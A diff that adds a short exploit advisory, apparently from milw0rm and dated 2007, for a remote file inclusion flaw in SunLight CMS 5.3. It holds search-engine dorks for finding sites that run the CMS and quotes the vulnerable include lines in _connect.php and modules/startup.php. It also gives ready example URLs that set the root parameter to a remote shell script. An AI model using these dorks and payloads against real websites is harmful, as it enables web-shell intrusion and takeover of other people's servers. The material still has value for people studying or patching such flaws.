@@ -1,0 +1,43 @@
+##############################################################################################
+#SunLight CMS 5.3 <= Remote File Inclusion Vulnerability
+#
+#Dork:""cms SunLight 5.2"
+#
+#Dork2:http://search.seznam.cz/searchScreen?w="cms+SunLight+5.2"&mod=f
+#
+#Vuln Code
+##############################################################################################
+#
+#ERROR1:_connect.php
+#
+#       /*-----vlozeni pristupovych dat-----*/
+#      include($root."_access.php");   <<< RFI CODE
+#
+#
+#BUG1:
+#
+#Example1:http://site.com/path/_connect.php?root=[[Sh3LL Script]]
+#
+#ERROR2:modules/startup.php
+#
+#    include($root."_connect.php");
+#    include($root."modules/sessions.php");
+#    include($root."modules/content_preload.php"); <<< RFI CODE
+#
+#
+#BUG1:
+#
+#Example1:http://site.com/path/modules/startup.php?root=[[Sh3LL Script]]
+#
+#Script Download
+##############################################################################################
+#
+#http://sunlight.profitux.cz/upload/stahuj/system/sunlight_53_standard.zip
+#
+##############################################################################################
+#
+#Cyber-Security
+#
+##############################################################################################
+
+# milw0rm.com [2007-05-19]
